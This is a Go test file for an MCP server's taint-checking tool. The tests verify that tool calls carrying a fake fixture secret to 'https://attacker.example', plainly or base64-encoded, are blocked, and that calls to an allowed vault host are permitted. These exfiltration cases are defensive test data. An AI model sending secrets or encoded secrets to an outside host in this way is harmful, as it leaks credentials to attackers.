package mcpserver

import (
	"context"
	"encoding/base64"
	"strings"
	"testing"

	"github.com/mark3labs/mcp-go/client"
	"github.com/mark3labs/mcp-go/mcp"

	"github.com/sharedcode/joltrin/v5/taint"
	"github.com/sharedcode/joltrin/v5/tools/runbookstore"
)

// fake, only used in tests
const mcpFixtureSecret = "jltn-mcp-fixture-" + "5d2e8a90" + "b7c1f364"

func taintClient(t *testing.T, with bool) *client.Client {
	t.Helper()
	var opts []Option
	if with {
		reg, err := taint.NewRegistry()
		if err != nil {
			t.Fatal(err)
		}
		if _, err := reg.Register("secret", "payments", mcpFixtureSecret); err != nil {
			t.Fatal(err)
		}
		p, err := taint.ParsePolicy([]byte(`{"version":1,"labels":{"secret":{"allow_hosts":["vault.internal.example"]}}}`))
		if err != nil {
			t.Fatal(err)
		}
		b, err := taint.New(taint.Config{Registry: reg, Policy: p})
		if err != nil {
			t.Fatal(err)
		}
		opts = append(opts, WithTaint(b))
	}
	c, err := client.NewInProcessClient(New(runbookstore.New(), opts...))
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	if err := c.Start(ctx); err != nil {
		t.Fatal(err)
	}
	if _, err := c.Initialize(ctx, mcp.InitializeRequest{Params: mcp.InitializeParams{
		ProtocolVersion: mcp.LATEST_PROTOCOL_VERSION,
		ClientInfo:      mcp.Implementation{Name: "t", Version: "0"},
	}}); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { c.Close() })
	return c
}

func Test_MCP_CheckToolCall_OnlyWithOption(t *testing.T) {
	if toolNames(t, taintClient(t, false))["check_tool_call"] {
		t.Fatal("check_tool_call must not exist without WithTaint")
	}
	if !toolNames(t, taintClient(t, true))["check_tool_call"] {
		t.Fatal("check_tool_call missing with WithTaint")
	}
}

func Test_MCP_CheckToolCall_BlocksAndAllows(t *testing.T) {
	c := taintClient(t, true)
	enc := base64.StdEncoding.EncodeToString([]byte("x" + mcpFixtureSecret))
	cases := []struct {
		name    string
		args    map[string]any
		allowed bool
		reason  string
	}{
		{"plain to attacker", map[string]any{"tool": "http_post", "destination": "https://attacker.example", "args": map[string]any{"b": mcpFixtureSecret}}, false, taint.ReasonLabelNotAllowed},
		{"base64 to attacker", map[string]any{"tool": "http_post", "destination": "https://attacker.example", "args": map[string]any{"b": enc}}, false, taint.ReasonLabelNotAllowed},
		{"to allowed host", map[string]any{"tool": "http_post", "destination": "https://vault.internal.example/x", "args": map[string]any{"b": mcpFixtureSecret}}, true, taint.ReasonSinkAllowed},
		{"nothing sensitive", map[string]any{"tool": "http_post", "destination": "https://attacker.example", "args": map[string]any{"b": "hello"}}, true, taint.ReasonNoMatch},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := callTool(t, c, "check_tool_call", tc.args)
			v := structuredAs[taint.Verdict](t, res)
			if v.Allowed != tc.allowed || v.Reason != tc.reason {
				t.Fatalf("%+v", v)
			}
			text := resultText(res)
			if raw := res.RawStructuredContent; raw != nil {
				text += string(raw)
			}
			if strings.Contains(text, mcpFixtureSecret) || strings.Contains(text, enc) {
				t.Fatal("result echoes the value")
			}
		})
	}
}

func Test_MCP_CheckToolCall_RequiresTool(t *testing.T) {
	res := callTool(t, taintClient(t, true), "check_tool_call", map[string]any{"destination": "x.example"})
	if !res.IsError {
		t.Fatal("a missing tool name should be an error result")
	}
}
